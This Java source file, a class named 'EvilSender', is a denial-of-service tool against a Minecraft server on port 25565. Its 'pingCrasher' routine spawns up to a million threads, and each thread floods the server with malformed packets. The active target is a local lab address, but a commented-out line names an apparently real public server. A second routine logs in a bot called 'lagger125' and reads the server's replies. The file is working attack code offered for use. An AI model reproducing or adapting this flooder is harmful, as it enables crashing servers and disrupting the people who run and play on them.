package protocolBot;

import lombok.SneakyThrows;
import protocolBot.packet.*;

import java.io.*;
import java.net.Socket;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.Scanner;

public class EvilSender {


    public static void main(String[] args) throws IOException, InterruptedException {
       /* while (true) {
            start();
        }*/
        //start();
        for(int i=0; i<1000000; i++){
            try{
                pingCrasher();
            }catch (Exception e){
                //e.printStackTrace();
            }

        }
    }

    public static void pingCrasher(){
        new Thread(){
            @SneakyThrows
            @Override
            public void start() {
                //Socket s = new Socket("epic-rpg.pl", 25565);
                Socket s = new Socket("192.168.56.104", 25565);
                //s.setSendBufferSize(5000);

                DataOutputStream out = new DataOutputStream(s.getOutputStream());
                byte [] handshakeMessage = HandshakePacket.create("192.168.56.104", 25565);
               //Packet.writeVarInt(out, handshakeMessage.length);
                //Packet.sendPacket(handshakeMessage, out);


                //byte[] ping = PingStatusPacket.create();
                byte[] ping = PingPacket.create();
                for(int i=0; i<1900; i++){
                    //Packet.writeVarInt(out, ping.length);
                    out.write(0x01);
                    out.write(0xFF);
                    out.flush();
                    //Packet.sendPacket(ping, out);
                    //out.flush();
                }
                s.close();
            }
        }.start();
    }

    public static void start(){
        try{
            Socket s = new Socket("192.168.56.104", 25565);
            //DataOutputStream out = new DataOutputStream(s.getOutputStream());
            //DataInputStream in = new DataInputStream(s.getInputStream());

            Scanner in = new Scanner(s.getInputStream());
            DataOutputStream out = new DataOutputStream(s.getOutputStream());

            byte [] handshakeMessage = HandshakePacket.create("192.168.56.105", 25565);
            Packet.writeVarInt(out, handshakeMessage.length);
            for(int i=0; i<1; i++){
                out.write(handshakeMessage);
                out.flush();
                Thread.sleep(1);
                //out.writeByte(0x01);
                //out.write(0x00);
                //out.flush();
                Thread.sleep(1);
                byte[] usernamePacket = StartLoginPacket.create("lagger125");
                Packet.writeVarInt(out, usernamePacket.length);
                out.write(usernamePacket);
                out.flush();
                Thread.sleep(1000);
            }

            String line;
            while ((line = in.nextLine()) != null){
                byte[] packet = line.getBytes();
                try{
                    if(packet[2] == 0x01){
                        //System.out.println("1: "+line);
                    }else if(packet[2] == 0x2F){
                        System.out.println(packet.length-1);
                        //System.out.println(packet[packet.length-1]);
                        //byte[] packet = TeleportConfirmPacket.create((int)packet[packet.length-1]);
                    }
                }catch (Exception e){}
            }

           /* int temp;
            temp = in.nextInt();
            System.out.println(temp);*/
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
